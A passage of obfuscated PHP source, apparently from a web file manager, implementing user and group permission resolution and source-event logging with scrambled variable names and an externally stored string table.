$this->makeSourceAuth($³˜¼„Ü, $çË»ÔÆÜ, $¦‘–çîœ); } return $£¤Õ‡·è; } public function authDeepCheck($ª¶ôµ¼Ô, $Ì¨™ôŸ = false) { $§©Ş®³ü =& $_SERVER[Õò”†—·]; $Ì¨™ôŸ = $Ì¨™ôŸ ? $Ì¨™ôŸ : USER_ID; $ºÚÅ¯Ëİ = $this->makeAuthDeep($Ì¨™ôŸ); if (!in_array($ª¶ôµ¼Ô, $ºÚÅ¯Ëİ[$§©Ş®³ü[2150]])) { return !1; } $ŞĞ´˜Ú = array(); foreach ($ºÚÅ¯Ëİ[$§©Ş®³ü[2151]] as $•Ô²¡· => $¿Ä×ì‰) { if (!in_array($ª¶ôµ¼Ô, $¿Ä×ì‰)) { continue; } $ŞĞ´˜Ú[] = $•Ô²¡·; } if (!$ŞĞ´˜Ú) { return !1; } $„ç›Ò—˜ = $ŞĞ´˜Ú ? $ŞĞ´˜Ú[0] : $ª¶ôµ¼Ô; return array($§©Ş®³ü[472] => -1, $§©Ş®³ü[524] => array($§©Ş®³ü[477] => $§©Ş®³ü[1242], $§©Ş®³ü[1959] => $§©Ş®³ü[229], $§©Ş®³ü[478] => LNG($§©Ş®³ü[2152]), $§©Ş®³ü[1976] => $§©Ş®³ü[2153]), $§©Ş®³ü[2154] => LNG($§©Ş®³ü[2155]), $§©Ş®³ü[2156] => $this->sourceAuthInfo($„ç›Ò—˜)); } protected function makeAuthDeep($Ç«º²¢ş = false) { $Æ¾Õ›ˆ =& $_SERVER[Õò”†—·]; static $ì‹‹Ô¡¡ = array(); $Ç«º²¢ş = $Ç«º²¢ş ? $Ç«º²¢ş : USER_ID; if (isset($ì‹‹Ô¡¡[$Ç«º²¢ş])) { return $ì‹‹Ô¡¡[$Ç«º²¢ş]; } $®É¬ë£÷ = Model($Æ¾Õ›ˆ[2157])->listData(); $Ï©¦èô… = array(); foreach ($®É¬ë£÷ as $ÑµÔó›€) { if ($ÑµÔó›€[$Æ¾Õ›ˆ[471]] == 0 && $ÑµÔó›€[$Æ¾Õ›ˆ[1975]] == $Æ¾Õ›ˆ[101]) { $Ï©¦èô…[] = $ÑµÔó›€[$Æ¾Õ›ˆ[459]]; } } $œä¡Œù’ = $this->userGroupParents($Ç«º²¢ş); $™šˆĞìê = array($Æ¾Õ›ˆ[191] => SourceModel::TYPE_USER, $Æ¾Õ›ˆ[554] => $Ç«º²¢ş); if ($œä¡Œù’) { $™šˆĞìê = array(array($Æ¾Õ›ˆ[191] => SourceModel::TYPE_USER, $Æ¾Õ›ˆ[554] => $Ç«º²¢ş), array($Æ¾Õ›ˆ[191] => SourceModel::TYPE_GROUP, $Æ¾Õ›ˆ[554] => array($Æ¾Õ›ˆ[476], $œä¡Œù’)), $Æ¾Õ›ˆ[1050] => $Æ¾Õ›ˆ[2056]); } $¢ŒÉ®Õ© = $this->field($Æ¾Õ›ˆ[2158])->where($™šˆĞìê)->select(); $³„ÂµÑø = array(); $ïÒú¨ü = array_to_keyvalue_group($¢ŒÉ®Õ©, $Æ¾Õ›ˆ[194]); foreach ($ïÒú¨ü as $›Ø–Ê× => $„ôŞîîÉ) { $¡Ãø×¸í = $this->authArrayCheck($„ôŞîîÉ, $Ç«º²¢ş); if ($¡Ãø×¸í[$Æ¾Õ›ˆ[472]] > 0) { $³„ÂµÑø[] = $›Ø–Ê× . $Æ¾Õ›ˆ[22]; } } if ($œä¡Œù’) { $ğê³¨‘î = Model($Æ¾Õ›ˆ[570]); foreach ($œä¡Œù’ as $‹÷àÑú) { $ö®§œ³û = $ğê³¨‘î->getInfo($‹÷àÑú); if (!$ö®§œ³û || !is_array($ö®§œ³û[$Æ¾Õ›ˆ[100]])) { continue; } $³„ÂµÑø[] = $ö®§œ³û[$Æ¾Õ›ˆ[100]][$Æ¾Õ›ˆ[194]]; } } $â ‘ÉØÂ = array(); $ø¨À¸Ñ‚ = $œä¡Œù’; $îÑ…ˆ = Model($Æ¾Õ›ˆ[1388]); $ğê³¨‘î = Model($Æ¾Õ›ˆ[570]); $À±­á”ä = array(); $¿‰šäµ = array(); $±³÷¢•« = array(); $¡ÃãôóŞ = array(); if ($³„ÂµÑø) { $°õ«ÈµÀ = $îÑ…ˆ->where(array($Æ¾Õ›ˆ[194] => array($Æ¾Õ›ˆ[476], $³„ÂµÑø)))->select(); foreach ($°õ«ÈµÀ as $µ¿ÜÃÁÊ) { $ª°ã¡Á = $îÑ…ˆ->parentLevelArray($µ¿ÜÃÁÊ[$Æ¾Õ›ˆ[569]]); $â ‘ÉØÂ = array_merge($â ‘ÉØÂ, $ª°ã¡Á); $ø¨À¸Ñ‚[] = $µ¿ÜÃÁÊ[$Æ¾Õ›ˆ[554]]; $À±­á”ä[$µ¿ÜÃÁÊ[$Æ¾Õ›ˆ[194]]] = $ª°ã¡Á; $¿‰šäµ[$µ¿ÜÃÁÊ[$Æ¾Õ›ˆ[194]]] = $µ¿ÜÃÁÊ[$Æ¾Õ›ˆ[554]]; } } $ø¨À¸Ñ‚ = array_values(array_unique($ø¨À¸Ñ‚)); $éÅ¨£€ã = $ø¨À¸Ñ‚; foreach ($éÅ¨£€ã as $‹÷àÑú) { $ö®§œ³û = $ğê³¨‘î->getInfo($‹÷àÑú); $ª°ã¡Á = $îÑ…ˆ->parentLevelArray($ö®§œ³û[$Æ¾Õ›ˆ[569]]); $ø¨À¸Ñ‚ = array_merge($ø¨À¸Ñ‚, $ª°ã¡Á); } $ø¨À¸Ñ‚ = array_values(array_unique($ø¨À¸Ñ‚)); foreach ($ø¨À¸Ñ‚ as $‹÷àÑú) { $ö®§œ³û = $ğê³¨‘î->getInfo($‹÷àÑú); $â ‘ÉØÂ[] = $ö®§œ³û[$Æ¾Õ›ˆ[100]][$Æ¾Õ›ˆ[194]]; $±³÷¢•«[$‹÷àÑú] = $ö®§œ³û[$Æ¾Õ›ˆ[100]][$Æ¾Õ›ˆ[194]]; $¡ÃãôóŞ[$‹÷àÑú] = $îÑ…ˆ->parentLevelArray($ö®§œ³û[$Æ¾Õ›ˆ[569]]); } foreach ($À±­á”ä as $½ÁåÇíš => $ÈËşñÜˆ) { $¬ŸØ’±¬ = $¿‰šäµ[$½ÁåÇíš]; if (!$¬ŸØ’±¬ || !$±³÷¢•«[$¬ŸØ’±¬]) { continue; } $‚ñ÷“½Â = array(); foreach ($¡ÃãôóŞ[$¬ŸØ’±¬] as $‹÷àÑú) { $‚ñ÷“½Â[] = $±³÷¢•«[$‹÷àÑú]; } $À±­á”ä[$½ÁåÇíš] = array_merge($‚ñ÷“½Â, $ÈËşñÜˆ); } $â ‘ÉØÂ = array_values(array_unique($â ‘ÉØÂ)); $½†¤äš = array($Æ¾Õ›ˆ[2150] => $â ‘ÉØÂ, $Æ¾Õ›ˆ[2151] => $À±­á”ä); $ì‹‹Ô¡¡[$Ç«º²¢ş] = $½†¤äš; return $½†¤äš; } private function makeSourceAuth($ó¾’İ–¸, $Ò… ÷™ä, $÷¡ßĞÀá = false) { $±®ÏÌ„„ =& $_SERVER[Õò”†—·]; $Ô”›¸ëº = $±®ÏÌ„„[101]; $Ã¸•Š³— = $ó¾’İ–¸[$±®ÏÌ„„[554]]; $àİ¼¶˜ = $ó¾’İ–¸[$±®ÏÌ„„[191]] == SourceModel::TYPE_GROUP; $—°¢ÈÃ = $àİ¼¶˜ ? $this->groupRootAuth($Ã¸•Š³—, $÷¡ßĞÀá) : !1; if ($—°¢ÈÃ && Model($±®ÏÌ„„[556])->authCheckAction($—°¢ÈÃ[$±®ÏÌ„„[471]], $±®ÏÌ„„[1974])) { return $this->groupAuthInfo($—°¢ÈÃ, $Ã¸•Š³—); } $÷Ó¦ˆ— = Model($±®ÏÌ„„[1388])->parentLevelArray($ó¾’İ–¸[$±®ÏÌ„„[569]]); $÷Ó¦ˆ— = array_merge(array($ó¾’İ–¸[$±®ÏÌ„„[194]]), array_reverse($÷Ó¦ˆ—)); $®±ÀÅ’˜ = !1; foreach ($÷Ó¦ˆ— as $´ÇÑä½è) { if (!isset($Ò… ÷™ä[$´ÇÑä½è])) { continue; } $˜ß«©î = $this->authMake($Ò… ÷™ä[$´ÇÑä½è], $÷¡ßĞÀá); if ($˜ß«©î[$±®ÏÌ„„[524]]) { $®±ÀÅ’˜ = $˜ß«©î; break; } } if (!$àİ¼¶˜) { return $®±ÀÅ’˜; } if (!$®±ÀÅ’˜ && $—°¢ÈÃ) { $®±ÀÅ’˜ = $this->groupAuthInfo($—°¢ÈÃ, $Ã¸•Š³—); } if (!$®±ÀÅ’˜) { $©‡„Ò¿• = Model($±®ÏÌ„„[570])->getInfo($Ã¸•Š³—); $‰üá÷‡Ï = explode($±®ÏÌ„„[60], trim($©‡„Ò¿•[$±®ÏÌ„„[569]], $±®ÏÌ„„[60])); $‰üá÷‡Ï = array_reverse($‰üá÷‡Ï); foreach ($‰üá÷‡Ï as $˜±ÅÇ¡è) { if ($˜±ÅÇ¡è == $±®ÏÌ„„[229] || $˜±ÅÇ¡è == $Ô”›¸ëº) { continue; } $—ç£¾•ò = $this->groupRootAuth($˜±ÅÇ¡è, $÷¡ßĞÀá); if (!$—ç£¾•ò) { continue; } $®±ÀÅ’˜ = $this->groupAuthInfo($—ç£¾•ò, $˜±ÅÇ¡è); break; } } if (!$®±ÀÅ’˜ || $®±ÀÅ’˜[$±®ÏÌ„„[472]] <= 0) { $¥€…İ× = $this->authDeepCheck($ó¾’İ–¸[$±®ÏÌ„„[194]], $÷¡ßĞÀá); if ($¥€…İ×) { $®±ÀÅ’˜ = $¥€…İ×; } } return $®±ÀÅ’˜; } private function userIsRoot($—åı³­ = false) { $£«Ó§û¹ =& $_SERVER[Õò”†—·]; if (!$—åı³­ && KodUser::isRoot()) { return !0; } $³‚ÊÅ¯­ = Model($£«Ó§û¹[583])->getInfo($—åı³­); $­±ƒˆ”¼ = Model($£«Ó§û¹[2159])->listData($³‚ÊÅ¯­[$£«Ó§û¹[2160]]); if ($­±ƒˆ”¼ && $­±ƒˆ”¼[$£«Ó§û¹[560]][$£«Ó§û¹[2161]] == 1) { return !0; } return !1; } private function sourceAuthInfo($›ÇÜÁä¢) { $¦Œ¾ü–Ô =& $_SERVER[Õò”†—·]; $ˆÛœ¿‰¿ = Model($¦Œ¾ü–Ô[1388]); $ƒÜ¾‰ = $ˆÛœ¿‰¿->sourceInfo($›ÇÜÁä¢); if (!$ƒÜ¾‰) { return !1; } $ˆÛœ¿‰¿->groupPathDisplay($ƒÜ¾‰); $„€¢éğ‡ = array($ƒÜ¾‰); $„€¢éğ‡ = $ˆÛœ¿‰¿->_listAppendPath($„€¢éğ‡); $ƒÜ¾‰ = $„€¢éğ‡[0]; $şŠçÖíƒ = $ƒÜ¾‰[$¦Œ¾ü–Ô[567]]; if (isset($ƒÜ¾‰[$¦Œ¾ü–Ô[575]])) { $¨–š¢è = explode($¦Œ¾ü–Ô[18], trim($ƒÜ¾‰[$¦Œ¾ü–Ô[567]], $¦Œ¾ü–Ô[18])); array_shift($¨–š¢è); $şŠçÖíƒ = $ƒÜ¾‰[$¦Œ¾ü–Ô[573]] . $¦Œ¾ü–Ô[2162] . implode($¦Œ¾ü–Ô[18], $¨–š¢è); } return array($¦Œ¾ü–Ô[478] => $ƒÜ¾‰[$¦Œ¾ü–Ô[42]], $¦Œ¾ü–Ô[97] => KodIO::make($ƒÜ¾‰[$¦Œ¾ü–Ô[194]]), $¦Œ¾ü–Ô[2163] => $şŠçÖíƒ); } private function groupAuthInfo($ö¹ï£ºğ, $ÔÎ›Ñ) { $Òöçã‹€ =& $_SERVER[Õò”†—·]; $½ãş‚‹ = Model($Òöçã‹€[570])->getInfo($ÔÎ›Ñ); return array($Òöçã‹€[2164] => intval($ö¹ï£ºğ[$Òöçã‹€[471]]), $Òöçã‹€[2147] => $ö¹ï£ºğ, $Òöçã‹€[2165] => LNG($Òöçã‹€[2166]), $Òöçã‹€[2156] => array($Òöçã‹€[478] => $½ãş‚‹[$Òöçã‹€[42]], $Òöçã‹€[97] => KodIO::make($½ãş‚‹[$Òöçã‹€[100]][$Òöçã‹€[194]]), $Òöçã‹€[2163] => $½ãş‚‹[$Òöçã‹€[574]])); } protected function groupRootAuth($‡»§Ú•­, $¥í¹¯Í = false) { $¯‹‡Ëíı =& $_SERVER[Õò”†—·]; $¥í¹¯Í = $¥í¹¯Í ? $¥í¹¯Í : USER_ID; $³¶·ğˆô = $¥í¹¯Í . $¯‹‡Ëíı[2167] . $‡»§Ú•­; static $úÂÚ  = array(); if (isset($úÂÚ [$³¶·ğˆô])) { return $úÂÚ [$³¶·ğˆô]; } $Ÿïş•âÌ = Model($¯‹‡Ëíı[570])->getInfo($‡»§Ú•­); $¯Œ…é¬¯ = $this->userGroupList($¥í¹¯Í); $—Ñ±¢İ¦ = isset($¯Œ…é¬¯[$‡»§Ú•­]) ? $¯Œ…é¬¯[$‡»§Ú•­][$¯‹‡Ëíı[471]] : !1; if ($—Ñ±¢İ¦ && Model($¯‹‡Ëíı[556])->authCheckAction($—Ñ±¢İ¦[$¯‹‡Ëíı[471]], $¯‹‡Ëíı[1974])) { $úÂÚ [$³¶·ğˆô] = $—Ñ±¢İ¦; return $—Ñ±¢İ¦; } $Íáç«¢Ñ = $this->sourceAuthSelect($Ÿïş•âÌ[$¯‹‡Ëíı[100]][$¯‹‡Ëíı[194]]); $¡•±×‰· = $Íáç«¢Ñ ? $this->authMake($Íáç«¢Ñ, $¥í¹¯Í) : !1; $ƒ²Š³ÁÅ = $¡•±×‰· ? $¡•±×‰·[$¯‹‡Ëíı[524]] : !1; $úÂÚ [$³¶·ğˆô] = $ƒ²Š³ÁÅ ? $ƒ²Š³ÁÅ : $—Ñ±¢İ¦; return $úÂÚ [$³¶·ğˆô]; } public function authOwnerApply($é’È–®) { $ÙìŒö—— =& $_SERVER[Õò”†—·]; if (empty($é’È–®[$ÙìŒö——[471]]) || isset($é’È–®[$ÙìŒö——[2168]]) && $é’È–®[$ÙìŒö——[2168]]) { return $é’È–®; } if (AuthModel::authCheckRoot($é’È–®[$ÙìŒö——[471]][$ÙìŒö——[472]])) { return $é’È–®; } $¬í§ß‡“ = Model($ÙìŒö——[1388])->parentLevelArray($é’È–®[$ÙìŒö——[569]]); $¬í§ß‡“ = array_merge(array($é’È–®[$ÙìŒö——[194]]), array_reverse($¬í§ß‡“)); $ñ»ÀÓ®í = $this->sourceAuthSelect($¬í§ß‡“); $ªûÙ® = array(); $’¦ŠÂ¸ş = array(); foreach ($ñ»ÀÓ®í as $¾ÁË–®Œ => $•íØ™ªè) { $µºµ‘½á = $this->authFolderOwnerUser($•íØ™ªè); $ªûÙ®[$¾ÁË–®Œ] = $µºµ‘½á; $’¦ŠÂ¸ş = array_merge($’¦ŠÂ¸ş, $µºµ‘½á[$ÙìŒö——[646]]); if ($µºµ‘½á[$ÙìŒö——[2169]]) { break; } } if (count($’¦ŠÂ¸ş) == 0) { $’¦ŠÂ¸ş = $this->authFolderOwnerGroup($é’È–®[$ÙìŒö——[554]]); } $’¦ŠÂ¸ş = array_unique($’¦ŠÂ¸ş); if (AuthModel::authCheckRoot($é’È–®[$ÙìŒö——[471]][$ÙìŒö——[472]])) { $’¦ŠÂ¸ş[] = USER_ID; } $é’È–®[$ÙìŒö——[471]][$ÙìŒö——[2170]] = Model($ÙìŒö——[562])->userListInfo($’¦ŠÂ¸ş); return $é’È–®; } private function authFolderOwnerGroup($…±ØÍ’ê) { $à„ª‚ıµ =& $_SERVER[Õò”†—·]; $şéñ“×Ş = Model($à„ª‚ıµ[2048])->where(array($à„ª‚ıµ[1953] => $…±ØÍ’ê))->select(); $Ó¿ÍÛ©ˆ = array(); if (!$şéñ“×Ş) { return $Ó¿ÍÛ©ˆ; } foreach ($şéñ“×Ş as $¨ª¥©¯) { $Ëìı¤¬¨ = $this->authInfo($¨ª¥©¯); if (AuthModel::authCheckRoot($Ëìı¤¬¨[$à„ª‚ıµ[471]])) { $Ó¿ÍÛ©ˆ[] = $¨ª¥©¯[$à„ª‚ıµ[1755]]; } } return $Ó¿ÍÛ©ˆ; } private function authFolderOwnerUser($ùâ®šìê) { $Ò³Ô¨ŸÆ =& $_SERVER[Õò”†—·]; $Ñò¹õ± = array(); $ùã€¸İÁ = !1; foreach ($ùâ®šìê as $İ¥À ÜÅ) { $³ÕÒÚ¡î = $this->authInfo($İ¥À ÜÅ); if ($İ¥À ÜÅ[$Ò³Ô¨ŸÆ[554]] == $Ò³Ô¨ŸÆ[229]) { $ùã€¸İÁ = !0; } if ($İ¥À ÜÅ[$Ò³Ô¨ŸÆ[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($³ÕÒÚ¡î[$Ò³Ô¨ŸÆ[471]])) { $Ñò¹õ±[] = $İ¥À ÜÅ[$Ò³Ô¨ŸÆ[554]]; } } } return array($Ò³Ô¨ŸÆ[646] => $Ñò¹õ±, $Ò³Ô¨ŸÆ[2169] => $ùã€¸İÁ); } public function authMake($«î•«ìò, $á•ÂÅ®ˆ = false) { $¤™ûÙô =& $_SERVER[Õò”†—·]; $éß¿êÁ = $this->authArrayCheck($«î•«ìò, $á•ÂÅ®ˆ); if ($éß¿êÁ[$¤™ûÙô[2171]]) { $éß¿êÁ[$¤™ûÙô[2171]] = $this->sourceAuthInfo($éß¿êÁ[$¤™ûÙô[2171]]); } return $éß¿êÁ; } public function authArrayCheck($Ì¼¸Û—, $ºûÕÎÖ» = false) { $ ¼…ƒû =& $_SERVER[Õò”†—·]; if (!$Ì¼¸Û—) { return array($ ¼…ƒû[472] => 0, $ ¼…ƒû[524] => !1); } $ºûÕÎÖ» = $ºûÕÎÖ» ? $ºûÕÎÖ» : USER_ID; $†º¾ëö¿ = 0; $İíÕÕäÛ = 0; $©ĞÔø„ï = 0; $û±†àÌ† = 0; $ÉÖä‘ŠÅ = 0; $Ì…æ­¬Ü = 0; $©ÂëÁ° = 1000; $¸ç«Ôõ£ = 0; $‰æîÆ« = 0; $¶õ¶‘ê = 0; $¢ƒ“¥…ø = 0; $…Ãû¾µ± = array($ ¼…ƒû[194] => 0); foreach ($Ì¼¸Û— as $…Ãû¾µ±) { $ò”ƒÄÑ = $this->authInfo($…Ãû¾µ±); if (!$ò”ƒÄÑ) { continue; } $“ÇøñŸ™ = $…Ãû¾µ±[$ ¼…ƒû[554]]; $Š®—î„‹ = intval($ò”ƒÄÑ[$ ¼…ƒû[471]]); if ($…Ãû¾µ±[$ ¼…ƒû[191]] == SourceModel::TYPE_USER && $“ÇøñŸ™ == $ºûÕÎÖ») { $†º¾ëö¿ = !0; $©ĞÔø„ï = $ò”ƒÄÑ; $İíÕÕäÛ = $Š®—î„‹; } else { if ($…Ãû¾µ±[$ ¼…ƒû[191]] == SourceModel::TYPE_GROUP && $this->groupContainUser($“ÇøñŸ™, $ºûÕÎÖ»)) { $û±†àÌ† = !0; $Û©°¢æ = $this->groupStepToUserGroup($“ÇøñŸ™, $ºûÕÎÖ»); if ($Û©°¢æ < $©ÂëÁ°) { $©ÂëÁ° = $Û©°¢æ; $ÉÖä‘ŠÅ = $Š®—î„‹; $Ì…æ­¬Ü = $ò”ƒÄÑ; $¸ç«Ôõ£ = $“ÇøñŸ™; } if ($Û©°¢æ == $©ÂëÁ° && $Š®—î„‹ >= $ÉÖä‘ŠÅ) { $ÉÖä‘ŠÅ = $Š®—î„‹; $Ì…æ­¬Ü = $ò”ƒÄÑ; $¸ç«Ôõ£ = $“ÇøñŸ™; } } else { if ($“ÇøñŸ™ == $ ¼…ƒû[229]) { $‰æîÆ« = !0; $¢ƒ“¥…ø = $ò”ƒÄÑ; $¶õ¶‘ê = $Š®—î„‹; } } } } if ($†º¾ëö¿) { $ƒĞò’¬Ğ = $İíÕÕäÛ; $ò”ƒÄÑ = $©ĞÔø„ï; $ã·ìëæú = LNG($ ¼…ƒû[2172]); } else { if ($û±†àÌ†) { $ƒĞò’¬Ğ = $ÉÖä‘ŠÅ; $ò”ƒÄÑ = $Ì…æ­¬Ü; $÷³ıÆ¡× = Model($ ¼…ƒû[570])->getInfo($¸ç«Ôõ£); $ã·ìëæú = $ ¼…ƒû[176] . $÷³ıÆ¡×[$ ¼…ƒû[574]] . $ ¼…ƒû[2173] . LNG($ ¼…ƒû[2174]); } else { if ($‰æîÆ«) { $ƒĞò’¬Ğ = $¶õ¶‘ê; $ò”ƒÄÑ = $¢ƒ“¥…ø; $ã·ìëæú = LNG($ ¼…ƒû[2144]); } else { $ƒĞò’¬Ğ = 0; $ò”ƒÄÑ = !1; $ã·ìëæú = $ ¼…ƒû[22]; } } } $´…Àù«… = array($ ¼…ƒû[2164] => intval($ƒĞò’¬Ğ), $ ¼…ƒû[2147] => $ò”ƒÄÑ, $ ¼…ƒû[2165] => $ã·ìëæú, $ ¼…ƒû[2156] => $…Ãû¾µ±[$ ¼…ƒû[194]]); return $´…Àù«…; } private function groupContainUser($Úƒ©¾ , $Ì·Ë´ò = false) { return in_array($Úƒ©¾ , $this->userGroupParents($Ì·Ë´ò)); } private function groupStepToUserGroup($¥ŠÍ§Ç, $½¾…ßµ¢ = false) { $äÖäŸ‘š =& $_SERVER[Õò”†—·]; $ú™ˆşò = $this->userGroupList($½¾…ßµ¢); $Äıšå…í = 1000; $Î¯êÚÑ = $GLOBALS[$äÖäŸ‘š[16]][$äÖäŸ‘š[102]][$äÖäŸ‘š[2061]] == 1; $áïÔ•Œ = $Î¯êÚÑ ? 3 : 2; foreach ($ú™ˆşò as $âÃ¥Í£³) { if ($âÃ¥Í£³[$äÖäŸ‘š[1953]] == $¥ŠÍ§Ç) { return 0; } $†àÙÂ’• = explode($äÖäŸ‘š[60], trim($âÃ¥Í£³[$äÖäŸ‘š[569]], $äÖäŸ‘š[60])); if ($†àÙÂ’•[0] == $äÖäŸ‘š[229] && count($†àÙÂ’•) > $áïÔ•Œ) { $°›ó“®Ü = array_reverse(array_slice($†àÙÂ’•, $áïÔ•Œ)); $óÏ£¼Óï = array_search($¥ŠÍ§Ç, $°›ó“®Ü); if ($óÏ£¼Óï !== !1 && $óÏ£¼Óï + 1 <= $Äıšå…í) { $Äıšå…í = $óÏ£¼Óï + 1; } } } return $Äıšå…í; } private function userGroupList($øÍÔúÚÏ = false) { $÷³¯úÉü =& $_SERVER[Õò”†—·]; static $Â‡½ñ¢À = array(); if (isset($Â‡½ñ¢À[$øÍÔúÚÏ])) { return $Â‡½ñ¢À[$øÍÔúÚÏ]; } $£÷—Õ„‘ = Model($÷³¯úÉü[583])->getInfo($øÍÔúÚÏ); $Â‡½ñ¢À[$øÍÔúÚÏ] = array_to_keyvalue($£÷—Õ„‘[$÷³¯úÉü[2145]], $÷³¯úÉü[1953]); return $Â‡½ñ¢À[$øÍÔúÚÏ]; } public function userGroupParents($ ßä¾ ì) { $“¿ªËì =& $_SERVER[Õò”†—·]; static $Ğ³«ÅÊò = array(); $ ßä¾ ì = $ ßä¾ ì ? $ ßä¾ ì : USER_ID; if (isset($Ğ³«ÅÊò[$ ßä¾ ì])) { return $Ğ³«ÅÊò[$ ßä¾ ì]; } $É°€Ì©î = $this->userGroupList($ ßä¾ ì); $ î‚¹‡‹ = array(); $–Ä•—­© = $GLOBALS[$“¿ªËì[16]][$“¿ªËì[102]][$“¿ªËì[2061]] == 1; $³²“äÛ = $–Ä•—­© ? 3 : 2; foreach ($É°€Ì©î as $İŒŒÚÎ) { $¡‹ÁŠ¡æ = array($İŒŒÚÎ[$“¿ªËì[1953]]); $ô©ÀÊóÍ = explode($“¿ªËì[60], trim($İŒŒÚÎ[$“¿ªËì[569]], $“¿ªËì[60])); if ($ô©ÀÊóÍ[0] == $“¿ªËì[229] && count($ô©ÀÊóÍ) > $³²“äÛ) { $±Ÿœß¿Ä = array_slice($ô©ÀÊóÍ, $³²“äÛ); $¡‹ÁŠ¡æ = array_merge($¡‹ÁŠ¡æ, array_reverse($±Ÿœß¿Ä)); } $ î‚¹‡‹ = array_merge($ î‚¹‡‹, $¡‹ÁŠ¡æ); } $Ğ³«ÅÊò[$ ßä¾ ì] = array_unique($ î‚¹‡‹); return $Ğ³«ÅÊò[$ ßä¾ ì]; } public function authTargetInfoMake($”ìá…İæ) { $ØÌöÃ±Â =& $_SERVER[Õò”†—·]; $“ÖÙªÚ = array(); $î¤ğùïñ = array(); foreach ($”ìá…İæ as $Œª×Ü ) { if ($Œª×Ü [$ØÌöÃ±Â[191]] == SourceModel::TYPE_USER) { $“ÖÙªÚ[] = intval($Œª×Ü [$ØÌöÃ±Â[554]]); } else { if ($Œª×Ü [$ØÌöÃ±Â[191]] == SourceModel::TYPE_GROUP) { $î¤ğùïñ[] = intval($Œª×Ü [$ØÌöÃ±Â[554]]); } } } if ($“ÖÙªÚ) { $“ÖÙªÚ = Model($ØÌöÃ±Â[562])->userListInfo($“ÖÙªÚ); } if ($î¤ğùïñ) { $•ğ˜åĞ = array($ØÌöÃ±Â[2046] => array($ØÌöÃ±Â[476], $î¤ğùïñ)); $î¤ğùïñ = Model($ØÌöÃ±Â[570])->field($ØÌöÃ±Â[2175])->where($•ğ˜åĞ)->select(); $î¤ğùïñ = array_to_keyvalue($î¤ğùïñ, $ØÌöÃ±Â[1953]); } return array($ØÌöÃ±Â[2176] => $“ÖÙªÚ, $ØÌöÃ±Â[2177] => $î¤ğùïñ); } public function authInfo($ä³á›ÓÍ) { $†›Ö¸ö¿ =& $_SERVER[Õò”†—·]; if ($ä³á›ÓÍ[$†›Ö¸ö¿[2062]]) { $¨ûİ³¦ë = Model($†›Ö¸ö¿[556])->listData($ä³á›ÓÍ[$†›Ö¸ö¿[2062]]); if (!$¨ûİ³¦ë) { return !1; $û€—§ = Model($†›Ö¸ö¿[556])->listData(); $è»ˆ‹ = array_filter_by_field($û€—§, $†›Ö¸ö¿[471], $†›Ö¸ö¿[229]); return $è»ˆ‹; } $ØÑ•ÒË§ = array_field_key($¨ûİ³¦ë, array($†›Ö¸ö¿[459], $†›Ö¸ö¿[42], $†›Ö¸ö¿[471], $†›Ö¸ö¿[1976], $†›Ö¸ö¿[1977])); $ØÑ•ÒË§[$†›Ö¸ö¿[2178]] = $ä³á›ÓÍ; return $ØÑ•ÒË§; } else { return array($†›Ö¸ö¿[477] => 0, $†›Ö¸ö¿[1959] => $ä³á›ÓÍ[$†›Ö¸ö¿[2122]], $†›Ö¸ö¿[478] => $†›Ö¸ö¿[22], $†›Ö¸ö¿[1976] => $†›Ö¸ö¿[2179]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\x75\162\143\145\x5f\145\166\x65\156\164"; protected $dataAuto = array(array("\143\162\145\x61\x74\x65\x54\x69\155\145", "\x74\x69\155\145", "\x69\156\163\x65\x72\x74", "\x66\x75\156\x63\x74\151\157\156"), array("\x64\x65\x73\x63", '', "\x69\x6e\x73\x65\x72\x74\x2c\165\x70\144\141\x74\x65\x2c\163\145\x6c\x65\143\164", "\152\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($¬Á­Ñè, $¸‹¶Ëš, $ÛÕï½Òü = '') { $­è†Š‰† =& $_SERVER[Õò”†—·]; if (!$this->eventSave) { return; } $ë¢–¾¡× = Model($­è†Š‰†[1388])->sourceInfo($¬Á­Ñè); if (!$ë¢–¾¡×) { return !1; } if ($this->isDisableEvent($ë¢–¾¡×, $¸‹¶Ëš)) { return; } if ($ÛÕï½Òü && is_string($ÛÕï½Òü)) { $ÛÕï½Òü = array($­è†Š‰†[1992] => $ÛÕï½Òü); } $°‹ŞïÊ = defined($­è†Š‰†[2180]) ? USER_ID : 0; $ÉÜä«Øˆ = array($­è†Š‰†[475] => $¬Á­Ñè, $­è†Š‰†[2181] => $ë¢–¾¡×[$­è†Š‰†[193]], $­è†Š‰†[2182] => $ë¢–¾¡×[$­è†Š‰†[42]], $­è†Š‰†[567] => !empty($ë¢–¾¡×[$­è†Š‰†[567]]) ? $ë¢–¾¡×[$­è†Š‰†[567]] : $­è†Š‰†[22], $­è†Š‰†[1746] => $°‹ŞïÊ, $­è†Š‰†[480] => $¸‹¶Ëš, $­è†Š‰†[1748] => $ÛÕï½Òü); $this->addSystemLog($¸‹¶Ëš, $ÉÜä«Øˆ); unset($ÉÜä«Øˆ[$­è†Š‰†[2182]], $ÉÜä«Øˆ[$­è†Š‰†[567]]); return $this->add($ÉÜä«Øˆ); } private function addSystemLog($ˆÚ¾ÂÜ¶, $÷íû”“®) { $»ÕéÇÛğ =& $_SERVER[Õò”†—·]; if ($ˆÚ¾ÂÜ¶ == $»ÕéÇÛğ[2183]) { $ˆÚ¾ÂÜ¶ = $÷íû”“®[$»ÕéÇÛğ[510]][$»ÕéÇÛğ[2184]]; } else { if (in_array($ˆÚ¾ÂÜ¶, array($»ÕéÇÛğ[1933], $»ÕéÇÛğ[2185]))) { $ˆÚ¾ÂÜ¶ = $÷íû”“®[$»ÕéÇÛğ[510]][$»ÕéÇÛğ[805]]; } } $¹ãÁ“× = array_merge($÷íû”“®, array($»ÕéÇÛğ[2186] => $÷íû”“®[$»ÕéÇÛğ[194]], $»ÕéÇÛğ[2187] => $÷íû”“®[$»ÕéÇÛğ[2187]])); Hook::trigger($»ÕéÇÛğ[2188], $»ÕéÇÛğ[2189] . $ˆÚ¾ÂÜ¶, $÷íû”“®); Model($»ÕéÇÛğ[1897])->addLog($»ÕéÇÛğ[2189] . $ˆÚ¾ÂÜ¶, $¹ãÁ“×); } private function isDisableEvent($ÎñçıÔ, $”×â©«) { $ÊÆÓÍÌ =& $_SERVER[Õò”†—·]; if ($ÎñçıÔ[$ÊÆÓÍÌ[191]] != SourceModel::TYPE_SYSTEM) { return !1; } if ($”×â©« == 